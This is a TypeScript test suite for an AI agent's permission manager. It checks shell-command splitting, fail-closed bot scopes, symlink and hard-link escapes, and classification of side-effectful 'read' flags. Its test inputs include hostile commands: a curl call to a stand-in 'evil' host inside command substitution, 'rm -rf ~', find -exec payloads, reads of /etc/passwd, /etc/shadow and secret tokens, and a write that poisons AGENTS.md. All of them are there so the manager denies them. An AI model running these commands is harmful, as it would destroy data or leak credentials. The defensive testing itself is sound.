import { describe, expect, it, vi, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, symlinkSync, linkSync, realpathSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { PermissionManager, splitShellSegments } from './permissions.js';

describe('splitShellSegments', () => {
  it('passes simple commands through as a single segment', () => {
    expect(splitShellSegments('ls -la')).toEqual(['ls -la']);
    expect(splitShellSegments('cat README.md')).toEqual(['cat README.md']);
    expect(splitShellSegments('pwd')).toEqual(['pwd']);
  });

  it('splits ;, &&, ||, |, & into separate segments', () => {
    expect(splitShellSegments('echo a; reboot now')).toEqual(['echo a', 'reboot now']);
    expect(splitShellSegments('ls && pwd')).toEqual(['ls', 'pwd']);
    expect(splitShellSegments('grep foo || echo missing')).toEqual(['grep foo', 'echo missing']);
    expect(splitShellSegments('cat foo | grep bar')).toEqual(['cat foo', 'grep bar']);
    expect(splitShellSegments('long-cmd &')).toEqual(['long-cmd']);
  });

  it('extracts $(...) command substitutions as separate segments', () => {
    expect(splitShellSegments('echo $(rm -rf ~)')).toContain('rm -rf ~');
    expect(splitShellSegments('cat "$(curl http://evil/x)"')).toContain('curl http://evil/x');
  });

  it('extracts backtick command substitutions as separate segments', () => {
    expect(splitShellSegments('echo `reboot now`')).toContain('reboot now');
    expect(splitShellSegments('echo "`sudo whoami`"')).toContain('sudo whoami');
  });

  it('keeps quoted text together', () => {
    expect(splitShellSegments('echo "a; b"')).toEqual(['echo "a; b"']);
    expect(splitShellSegments("echo 'a; b'")).toEqual(["echo 'a; b'"]);
  });

  it('does not expand escaped $(...) inside double quotes', () => {
    expect(splitShellSegments('echo "\\$(rm -rf ~)"')).toEqual(['echo "\\$(rm -rf ~)"']);
  });

  it('decomposes nested substitution', () => {
    const segs = splitShellSegments('echo `echo nested $(reboot now)`');
    expect(segs).toContain('reboot now');
  });

  it('decomposes subshell () and brace {} blocks', () => {
    expect(splitShellSegments('( reboot now )')).toEqual(['reboot now']);
    expect(splitShellSegments('{ reboot now; }')).toEqual(['reboot now']);
  });
});

describe('fail-closed execute scopes (bots)', () => {
  function managerWithExecuteScope() {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.filesystem.scopes = [
      { path: '/tmp/execdir', read: true, write: false, execute: true },
      { path: '/tmp/readonlydir', read: true, write: false },
    ];
    permissions.setAutoApproveAll(false);
    permissions.setFailClosed(true);
    permissions.setCurrentContext('bot', 'worker');
    return permissions;
  }

  it('runs a command whose path arguments all lie inside an execute scope', async () => {
    const permissions = managerWithExecuteScope();
    await expect(permissions.checkShellCommand('node /tmp/execdir/tool.js --flag')).resolves.toMatchObject({ allowed: true, needsApproval: false });
  });

  it('denies a command that reaches outside the execute scope', async () => {
    const permissions = managerWithExecuteScope();
    await expect(permissions.checkShellCommand('node /tmp/execdir/tool.js /etc/passwd')).resolves.toMatchObject({ allowed: false });
  });

  it('does not treat a read-only (non-execute) scope as execute', async () => {
    const permissions = managerWithExecuteScope();
    await expect(permissions.checkShellCommand('node /tmp/readonlydir/tool.js')).resolves.toMatchObject({ allowed: false });
  });

  it('blocked commands win over execute scopes', async () => {
    const permissions = managerWithExecuteScope();
    permissions.getManifest().capabilities.shell.blocked = ['rm *'];
    await expect(permissions.checkShellCommand('rm -rf /tmp/execdir')).resolves.toMatchObject({ allowed: false });
  });

  it('commands without path arguments stay approval-gated (cwd is not a grant)', async () => {
    const permissions = managerWithExecuteScope();
    await expect(permissions.checkShellCommand('npm install')).resolves.toMatchObject({ allowed: false });
  });

  it('a bare script path inside the execute scope runs without approval', async () => {
    const permissions = managerWithExecuteScope();
    await expect(permissions.checkShellCommand('/tmp/execdir/run.sh --serve')).resolves.toMatchObject({ allowed: true, needsApproval: false });
  });

  it('an ambient global autoApproved list never elevates a fail-closed context', async () => {
    const permissions = managerWithExecuteScope();
    // Simulate a global permissions.yaml where the user approved "node *":
    // an unattended bot must NOT inherit it.
    permissions.getManifest().capabilities.shell.autoApproved = ['node *'];
    await expect(permissions.checkShellCommand('node script.js')).resolves.toMatchObject({ allowed: false });
    // Explicit bot grants DO apply.
    permissions.setBotShellAllowList(['node *']);
    await expect(permissions.checkShellCommand('node script.js')).resolves.toMatchObject({ allowed: true, needsApproval: false });
    // needsApproval still wins over the bot list.
    permissions.getManifest().capabilities.shell.needsApproval = ['node *'];
    await expect(permissions.checkShellCommand('node script.js')).resolves.toMatchObject({ allowed: false });
  });
});

describe('fail-closed skill elevation', () => {
  it('elevateForSkill is a no-op in fail-closed mode (skills never re-permission a bot)', async () => {
    const permissions = new PermissionManager();
    permissions.getManifest().capabilities.shell.enabled = true;
    permissions.setFailClosed(true);
    permissions.setCurrentContext('bot', 'worker');
    permissions.elevateForSkill(['fs_write', 'run_command', 'read_file']);
    // Without the guard, elevation would bypass the fail-closed gates.
    await expect(permissions.checkFsAccess('/etc/hosts', 'write')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('npm install')).resolves.toMatchObject({ allowed: false });
  });
});

describe('most-specific scope wins', () => {
  it('a deep grant is not shadowed by a broader read-only ancestor', async () => {
    const permissions = new PermissionManager();
    permissions.getManifest().capabilities.filesystem.scopes = [
      { path: '/tmp/root', read: true, write: false },
      { path: '/tmp/root/deep', read: true, write: true },
    ];
    permissions.setFailClosed(true);
    permissions.setCurrentContext('bot', 'worker');
    await expect(permissions.checkFsAccess('/tmp/root/deep/file.txt', 'write')).resolves.toMatchObject({ allowed: true });
    await expect(permissions.checkFsAccess('/tmp/root/other.txt', 'write')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkFsAccess('/tmp/root/other.txt', 'read')).resolves.toMatchObject({ allowed: true });
  });
});

describe('PermissionManager remote safety', () => {
  it('enforces hard command blocks before Local allow-all', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = ['rm *'];
    permissions.setAutoApproveAll(true);

    await expect(permissions.checkShellCommand('rm -rf project')).resolves.toMatchObject({ allowed: false });
  });

  it('does not let Local CLI allow-all silently elevate a Cloud request', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValue('yes');
    permissions.onAsk(ask);
    permissions.setAutoApproveAll(true);
    permissions.setCurrentContext('web', 'cloud-request-1');

    await expect(permissions.checkShellCommand('npm install example')).resolves.toMatchObject({ allowed: true });
    expect(ask).toHaveBeenCalledOnce();
  });

  it('scopes always approval to the exact command and interaction context', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValueOnce('always').mockResolvedValue('no');
    permissions.onAsk(ask);
    permissions.setCurrentContext('web', 'cloud-request-1');

    await expect(permissions.checkShellCommand('npm install example')).resolves.toMatchObject({ allowed: true });
    await expect(permissions.checkShellCommand('npm install example')).resolves.toMatchObject({ allowed: true });
    await expect(permissions.checkShellCommand('npm install different')).resolves.toMatchObject({ allowed: false });
    expect(ask).toHaveBeenCalledTimes(2);
  });

  it('does not classify redirection or mutating read-command flags as safe reads', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValue('no');
    permissions.onAsk(ask);
    permissions.setCurrentContext('web', 'cloud-request-1');

    await expect(permissions.checkShellCommand('echo poisoned > AGENTS.md')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('echo poisoned>AGENTS.md')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('find . -delete')).resolves.toMatchObject({ allowed: false });
    // find -exec/-execdir launch a subprocess — the advisory payload from
    // issues #71/#77/#101 (and #110), minus the redirection so this exercises
    // the find-flag rule on its own rather than the redirection rule.
    await expect(permissions.checkShellCommand("find . -maxdepth 0 -exec sh -c 'id' ';'")).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('find . -execdir touch canary \\;')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('git branch -D protected')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('git branch --delete protected')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('git branch new-branch')).resolves.toMatchObject({ allowed: false });
    expect(ask).toHaveBeenCalledTimes(8);
  });

  // POSIX read tools (wc/find/du/head) are not in the pinned Windows dirs, so
  // there they always prompt (ADR-016); the auto-approve half is POSIX-only.
  it.skipIf(process.platform === 'win32')('does not classify wc --files0-from as a safe read (indirect path deref)', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValue('no');
    permissions.onAsk(ask);
    permissions.setCurrentContext('web', 'cloud-request-1');

    // ``--files0-from`` reads the paths listed inside the file, which the
    // literal-path gate never inspects at approval time.
    await expect(permissions.checkShellCommand('wc --files0-from=list0.bin')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('wc --files0-from list0.bin')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('wc -l --files0-from=list0.bin')).resolves.toMatchObject({ allowed: false });
    // A plain wc read stays auto-approved.
    await expect(permissions.checkShellCommand('wc -l README.md')).resolves.toMatchObject({ allowed: true });
    expect(ask).toHaveBeenCalledTimes(3);
  });

  // POSIX read tools (wc/find/du/head) are not in the pinned Windows dirs, so
  // there they always prompt (ADR-016); the auto-approve half is POSIX-only.
  it.skipIf(process.platform === 'win32')('find -fprint/-fprintf/-files0-from are side-effectful or indirect — require approval', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValue('no');
    permissions.onAsk(ask);
    permissions.setCurrentContext('web', 'cloud-request-1');

    // -fprint/-fprintf WRITE files with an attacker-chosen path — the same
    // arbitrary-write class the -exec deny covers (issue #110's family).
    await expect(permissions.checkShellCommand('find . -fprint out.txt')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('find . -fprintf out.txt %p')).resolves.toMatchObject({ allowed: false });
    // -files0-from dereferences a path list the literal-path gate never sees.
    await expect(permissions.checkShellCommand('find . -files0-from=list.bin')).resolves.toMatchObject({ allowed: false });
    // The generic indirection rule covers the other safe-read commands.
    await expect(permissions.checkShellCommand('du --files0-from=list.bin')).resolves.toMatchObject({ allowed: false });
    // Plain reads must keep working without a prompt.
    await expect(permissions.checkShellCommand('find . -maxdepth 1')).resolves.toMatchObject({ allowed: true });
    await expect(permissions.checkShellCommand('du -sh .')).resolves.toMatchObject({ allowed: true });
    expect(ask).toHaveBeenCalledTimes(4);
  });

  // POSIX read tools (wc/find/du/head) are not in the pinned Windows dirs, so
  // there they always prompt (ADR-016); the auto-approve half is POSIX-only.
  it.skipIf(process.platform === 'win32')('requires approval for safe-read commands that rely on shell expansion', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValue('no');
    permissions.onAsk(ask);
    permissions.setCurrentContext('web', 'cloud-request-1');

    // $HOME/… expands to a path the literal gate never saw (CVE-2026-28463).
    await expect(permissions.checkShellCommand('head $HOME/secret.txt')).resolves.toMatchObject({ allowed: false });
    // ${…} and command substitution are the same class.
    await expect(permissions.checkShellCommand('cat ${HOME}/secret.txt')).resolves.toMatchObject({ allowed: false });
    // $VAR discloses environment values (issue #76/#80).
    await expect(permissions.checkShellCommand('echo $TOKEN')).resolves.toMatchObject({ allowed: false });
    // Home shorthands expand after the check too.
    await expect(permissions.checkShellCommand('cat ~/secret.txt')).resolves.toMatchObject({ allowed: false });
    // ANSI-C quoting expands hex/unicode escapes post-check (same class as #95).
    await expect(permissions.checkShellCommand("head $'\\x2fetc\\x2fpasswd'")).resolves.toMatchObject({ allowed: false });
    // A plain read relative to cwd stays auto-approved.
    await expect(permissions.checkShellCommand('head file.txt')).resolves.toMatchObject({ allowed: true });
  });
});

describe('PermissionManager symlink write confinement', () => {
  let root: string;
  let ws: string;
  let outside: string;

  function makePermissions(): PermissionManager {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.filesystem.enabled = true;
    manifest.capabilities.filesystem.scopes.push({ path: ws, read: true, write: true });
    permissions.setAutoApproveAll(true);
    return permissions;
  }

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'mercury-fs-'));
    ws = join(root, 'ws');
    outside = join(root, 'outside');
    mkdirSync(ws);
    mkdirSync(outside);
    writeFileSync(join(outside, 'secret.txt'), 'x');
    symlinkSync(join(outside, 'secret.txt'), join(ws, 'alias.txt'));
  });

  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it('denies a write that escapes the scope through an in-scope symlink', async () => {
    const permissions = makePermissions();
    await expect(permissions.checkFsAccess(join(ws, 'alias.txt'), 'write')).resolves.toMatchObject({ allowed: false });
  });

  it('still allows a plain write inside the scope', async () => {
    const permissions = makePermissions();
    await expect(permissions.checkFsAccess(join(ws, 'new.txt'), 'write')).resolves.toMatchObject({ allowed: true });
  });

  it('allows a symlink whose target stays inside the scope', async () => {
    const permissions = makePermissions();
    writeFileSync(join(ws, 'inner.txt'), 'x');
    symlinkSync(join(ws, 'inner.txt'), join(ws, 'inner-alias.txt'));
    await expect(permissions.checkFsAccess(join(ws, 'inner-alias.txt'), 'write')).resolves.toMatchObject({ allowed: true });
  });
});

describe('PermissionManager read-side canonicalisation (symlink reads, #104 hard links)', () => {
  let root: string;
  let ws: string;
  let outside: string;

  function makePermissions(opts: { ask?: (prompt: string) => Promise<string>; context?: [string, string] } = {}): PermissionManager {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.filesystem.enabled = true;
    manifest.capabilities.filesystem.scopes = [{ path: ws, read: true, write: false }];
    permissions.setAutoApproveAll(false);
    permissions.setCurrentContext(...(opts.context ?? ['web', 'cloud-request-1']));
    if (opts.ask) permissions.onAsk(opts.ask);
    return permissions;
  }

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'mercury-read-'));
    ws = join(root, 'ws');
    outside = join(root, 'outside');
    mkdirSync(ws);
    mkdirSync(outside);
    writeFileSync(join(outside, 'id_rsa'), 'PRIVATE');
    writeFileSync(join(ws, 'plain.txt'), 'plain');
    writeFileSync(join(ws, 'inner.txt'), 'inner');
    symlinkSync(join(outside, 'id_rsa'), join(ws, 'alias.txt'));
    symlinkSync(join(ws, 'inner.txt'), join(ws, 'inner-alias.txt'));
    writeFileSync(join(ws, 'linked.txt'), 'linked');
    linkSync(join(ws, 'linked.txt'), join(outside, 'linked-alias.txt'));
  });

  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it('allows a plain in-scope read and reports the canonical path and file identity', async () => {
    const ask = vi.fn().mockResolvedValue('no');
    const permissions = makePermissions({ ask });
    const result = await permissions.checkFsAccess(join(ws, 'plain.txt'), 'read');
    expect(result.allowed).toBe(true);
    expect(result.canonical).toBe(realpathSync(join(ws, 'plain.txt')));
    expect(result.fileId).toMatchObject({ dev: expect.any(Number), ino: expect.any(Number) });
    expect(ask).not.toHaveBeenCalled();
  });

  it('denies an in-scope symlink whose target is outside every readable scope (no handler)', async () => {
    const permissions = makePermissions();
    const result = await permissions.checkFsAccess(join(ws, 'alias.txt'), 'read');
    expect(result).toMatchObject({ allowed: false, code: 'symlink-escape', canonical: realpathSync(join(outside, 'id_rsa')) });
    expect(result.reason).toContain('resolves outside the approved scopes');
  });

  it('asks for the symlink TARGET when a handler exists, and denies on "no"', async () => {
    const ask = vi.fn().mockResolvedValue('no');
    const permissions = makePermissions({ ask });
    const result = await permissions.checkFsAccess(join(ws, 'alias.txt'), 'read');
    expect(result).toMatchObject({ allowed: false, code: 'symlink-escape' });
    expect(ask).toHaveBeenCalledTimes(1);
    expect(ask.mock.calls[0][0]).toContain(realpathSync(join(outside, 'id_rsa')));
  });

  it('allows the symlink read once the user approves the target', async () => {
    const ask = vi.fn().mockResolvedValue('yes');
    const permissions = makePermissions({ ask });
    const result = await permissions.checkFsAccess(join(ws, 'alias.txt'), 'read');
    expect(result).toMatchObject({ allowed: true, canonical: realpathSync(join(outside, 'id_rsa')) });
    expect(result.fileId).toBeDefined();
  });

  it('never prompts for the symlink target in fail-closed mode', async () => {
    const ask = vi.fn().mockResolvedValue('yes');
    const permissions = makePermissions({ ask });
    permissions.setFailClosed(true);
    await expect(permissions.checkFsAccess(join(ws, 'alias.txt'), 'read')).resolves.toMatchObject({ allowed: false, code: 'symlink-escape' });
    expect(ask).not.toHaveBeenCalled();
  });

  it('allows a symlink whose target stays inside the scope', async () => {
    const ask = vi.fn().mockResolvedValue('no');
    const permissions = makePermissions({ ask });
    const result = await permissions.checkFsAccess(join(ws, 'inner-alias.txt'), 'read');
    expect(result).toMatchObject({ allowed: true, canonical: realpathSync(join(ws, 'inner.txt')) });
    expect(ask).not.toHaveBeenCalled();
  });

  it('routes a hard-linked file (nlink > 1) through the approval handler', async () => {
    const ask = vi.fn().mockResolvedValue('no');
    const permissions = makePermissions({ ask });
    const denied = await permissions.checkFsAccess(join(ws, 'linked.txt'), 'read');
    expect(denied).toMatchObject({ allowed: false, code: 'hardlink' });
    expect(ask).toHaveBeenCalledTimes(1);
    expect(ask.mock.calls[0][0]).toMatch(/hard-linked/);

    ask.mockResolvedValue('yes');
    const allowed = await permissions.checkFsAccess(join(ws, 'linked.txt'), 'read');
    expect(allowed).toMatchObject({ allowed: true, canonical: realpathSync(join(ws, 'linked.txt')) });
  });

  it('"always" remembers the hard-linked file for the interaction context', async () => {
    const ask = vi.fn().mockResolvedValue('always');
    const permissions = makePermissions({ ask });
    await expect(permissions.checkFsAccess(join(ws, 'linked.txt'), 'read')).resolves.toMatchObject({ allowed: true });
    await expect(permissions.checkFsAccess(join(ws, 'linked.txt'), 'read')).resolves.toMatchObject({ allowed: true });
    expect(ask).toHaveBeenCalledTimes(1);
    // A different context asks again.
    permissions.setCurrentContext('web', 'cloud-request-2');
    await expect(permissions.checkFsAccess(join(ws, 'linked.txt'), 'read')).resolves.toMatchObject({ allowed: true });
    expect(ask).toHaveBeenCalledTimes(2);
  });

  it('denies a hard-linked file when nothing can ask (no handler, fail-closed, internal)', async () => {
    await expect(makePermissions().checkFsAccess(join(ws, 'linked.txt'), 'read')).resolves.toMatchObject({ allowed: false, code: 'hardlink' });

    const ask = vi.fn().mockResolvedValue('yes');
    const failClosed = makePermissions({ ask });
    failClosed.setFailClosed(true);
    await expect(failClosed.checkFsAccess(join(ws, 'linked.txt'), 'read')).resolves.toMatchObject({ allowed: false, code: 'hardlink' });

    const internal = makePermissions({ ask, context: ['internal', 'internal'] });
    await expect(internal.checkFsAccess(join(ws, 'linked.txt'), 'read')).resolves.toMatchObject({ allowed: false, code: 'hardlink' });
    expect(ask).not.toHaveBeenCalled();
  });

  it('skips the hard-link prompt under Local allow-all', async () => {
    const ask = vi.fn().mockResolvedValue('no');
    const permissions = makePermissions({ ask, context: ['cli', 'cli'] });
    permissions.setAutoApproveAll(true);
    await expect(permissions.checkFsAccess(join(ws, 'linked.txt'), 'read')).resolves.toMatchObject({ allowed: true });
    expect(ask).not.toHaveBeenCalled();
  });

  it('a directory with many links (subdirectories) is not treated as a hard-link alias', async () => {
    mkdirSync(join(ws, 'dir', 'a'), { recursive: true });
    mkdirSync(join(ws, 'dir', 'b'));
    const ask = vi.fn().mockResolvedValue('no');
    const permissions = makePermissions({ ask });
    await expect(permissions.checkFsAccess(join(ws, 'dir'), 'read')).resolves.toMatchObject({ allowed: true });
    expect(ask).not.toHaveBeenCalled();
  });

  it('a temp scope granted on a directory of symlinks does not reach through them', async () => {
    // The user approved the directory (session scope); its entries are
    // symlinks whose targets are still outside every readable scope → denied.
    mkdirSync(join(root, 'links'));
    symlinkSync(join(outside, 'id_rsa'), join(root, 'links', 'key'));
    const permissions = makePermissions();
    permissions.addTempScope(join(root, 'links'), true, false);
    const result = await permissions.checkFsAccess(join(root, 'links', 'key'), 'read');
    expect(result).toMatchObject({ allowed: false, code: 'symlink-escape', canonical: realpathSync(join(outside, 'id_rsa')) });
  });

  it('still returns the plain denial for an out-of-scope read without a handler', async () => {
    const permissions = makePermissions();
    const result = await permissions.checkFsAccess(join(outside, 'id_rsa'), 'read');
    expect(result).toMatchObject({ allowed: false, code: 'denied' });
    expect(result.reason).toBe(`Permission denied for read access to ${join(outside, 'id_rsa')}`);
  });
});

describe('safe-read classifier: residual side-effect flags (table)', () => {
  function makePermissions() {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValue('no');
    permissions.onAsk(ask);
    permissions.setCurrentContext('web', 'cloud-request-1');
    // Verdicts must not depend on which tools the CI host has installed
    // (tree/rg are often absent from the pinned system dirs).
    permissions.setBinaryResolver((p) => `/usr/bin/${p}`);
    return { permissions, ask };
  }

  const requiresApproval: Array<[string, string]> = [
    ['find . -fprint0 out.bin', 'find -fprint0 writes a file (the old \\b after -fprint stopped at the digit)'],
    ['find . -fprint0=out.bin', 'find -fprint0= form'],
    ['find . -fls out.txt', 'find -fls writes an ls-style listing'],
    ['find . -type f -fprintf out.txt %p', 'find -fprintf writes a file'],
    ['tree -o out.txt', 'tree -o writes the listing'],
    ['tree -ao out.txt', 'tree -o inside a short-flag cluster'],
    ['tree --output out.txt', 'tree --output'],
    ['git log --output=hist.txt', 'git log --output= writes a file'],
    ['git log --output hist.txt', 'git log --output writes a file'],
    ['git diff --output=d.patch', 'git diff --output= writes a file'],
    ['git diff --ext-diff', 'git diff --ext-diff runs the configured external diff'],
    ['git log -p --ext-diff', 'git log --ext-diff runs the configured external diff'],
    ['git diff --no-index a.txt b.txt', 'git diff --no-index diffs arbitrary paths'],
    ['rg --pre cat secret', 'rg --pre runs a preprocessor'],
    ['rg --pre=./leak.sh secret', 'rg --pre= runs a preprocessor'],
    ['curl -o out.html http://example.com', 'curl -o writes a file'],
    ['curl -O http://example.com/x.sh', 'curl -O writes the remote name'],
    ['curl -sSLo out.sh http://example.com', 'curl -o inside a short-flag cluster'],
    ['curl -sSLJO http://example.com', 'curl -J/-O inside a cluster'],
    ['curl --output out.html http://example.com', 'curl --output'],
    ['curl --remote-name http://example.com/x', 'curl --remote-name'],
    // Relative paths on purpose: an absolute path outside the cwd is denied
    // by the cwd gate before the classifier can prompt (macOS /tmp → /private/tmp).
    ['curl --output-dir downloads -O http://example.com/x', 'curl --output-dir'],
    ['wget -O out.html http://example.com', 'wget -O'],
    ['wget --output-document=out.html http://example.com', 'wget --output-document='],
    ['wget -o log.txt http://example.com', 'wget -o writes a log file'],
    ['wget -P downloads http://example.com', 'wget -P chooses the download directory'],
    ['wget -qO- http://example.com', 'wget -O inside a cluster'],
  ];

  it.each(requiresApproval)('%s → requires approval (%s)', async (command) => {
    const { permissions, ask } = makePermissions();
    await expect(permissions.checkShellCommand(command)).resolves.toMatchObject({ allowed: false });
    expect(ask).toHaveBeenCalledTimes(1);
  });

  const staysAutoApproved: Array<[string, string]> = [
    ['find . -name "*.ts" -print0', 'find -print0 only prints'],
    ['find . -type f -newer README.md', 'plain find'],
    ['tree -a -L 2', 'tree without an output flag'],
    ['git log --oneline -n 5', 'plain git log'],
    ['git log --format=%H', 'git log --format is read-only'],
    ['git diff --stat', 'plain git diff'],
    ['git diff --no-ext-diff', '--no-ext-diff disables the external diff'],
    ['rg --pretty pattern src', 'rg --pretty is not --pre'],
    ['rg -n pattern src', 'plain rg'],
    ['ls -o', 'ls has no write flags; -o is a listing format'],
    ['grep -o pattern file.txt', 'grep -o prints only matches'],
  ];

  it.each(staysAutoApproved)('%s → auto-approved (%s)', async (command) => {
    const { permissions, ask } = makePermissions();
    await expect(permissions.checkShellCommand(command)).resolves.toMatchObject({ allowed: true });
    expect(ask).not.toHaveBeenCalled();
  });
});

describe('argv lane (ADR-016)', () => {
  function makePermissions(installed: (p: string) => string | undefined = (p) => `/usr/bin/${p}`) {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValue('no');
    permissions.onAsk(ask);
    permissions.setCurrentContext('web', 'cloud-request-1');
    permissions.setBinaryResolver(installed);
    return { permissions, ask };
  }

  it('auto-approves through the argv lane and says so', async () => {
    const { permissions, ask } = makePermissions();
    for (const cmd of ['ls', 'git status', 'git branch', 'pwd', 'cat "README.md"', 'grep -rn "a b" src']) {
      await expect(permissions.checkShellCommand(cmd)).resolves.toMatchObject({ allowed: true, lane: 'argv' });
    }
    expect(ask).not.toHaveBeenCalled();
  });

  it('sends pipelines and chains of read-only commands to the approval lane', async () => {
    const { permissions, ask } = makePermissions();
    ask.mockResolvedValue('yes');
    for (const cmd of ['git log | head', 'ls && pwd', 'cat a; cat b']) {
      await expect(permissions.checkShellCommand(cmd)).resolves.toMatchObject({ allowed: true, lane: 'shell' });
    }
    expect(ask).toHaveBeenCalledTimes(3);
    expect(ask).toHaveBeenCalledWith('Run command: git log | head');
  });

  it('sees through quoting: a quoted path outside the cwd and readable scopes prompts', async () => {
    const { permissions, ask } = makePermissions();
    permissions.getManifest().capabilities.shell.cwdOnly = false;
    // Only the workspace is readable (independent of the host's permissions.yaml).
    permissions.getManifest().capabilities.filesystem.scopes = [{ path: process.cwd(), read: true, write: true }];
    await expect(permissions.checkShellCommand('cat "/etc/passwd"')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('grep --file="/etc/shadow" x')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand("cat 'sub/../../outside.txt'")).resolves.toMatchObject({ allowed: false });
    expect(ask).toHaveBeenCalledTimes(3);
  });

  it('an allowlisted program missing from the pinned PATH goes to the approval lane (#103)', async () => {
    const { permissions, ask } = makePermissions(() => undefined);
    await expect(permissions.checkShellCommand('rg -n pattern src')).resolves.toMatchObject({ allowed: false });
    expect(ask).toHaveBeenCalledWith('Run command: rg -n pattern src');
  });

  it('checks paths against the tool cwd when given', async () => {
    const { permissions, ask } = makePermissions();
    permissions.getManifest().capabilities.shell.cwdOnly = false;
    permissions.getManifest().capabilities.filesystem.scopes = [];
    await expect(permissions.checkShellCommand('cat ../x.txt', { cwd: '/work/project/sub' })).resolves.toMatchObject({ allowed: false });
    expect(ask).toHaveBeenCalledTimes(1);
  });

  it('allow-all still approves anything not hard-blocked, through the approval lane', async () => {
    const { permissions, ask } = makePermissions();
    permissions.setCurrentContext('cli', 'cli');
    permissions.setAutoApproveAll(true);
    await expect(permissions.checkShellCommand('npm test | tee out.txt')).resolves.toMatchObject({ allowed: true, lane: 'shell' });
    expect(ask).not.toHaveBeenCalled();
  });
});
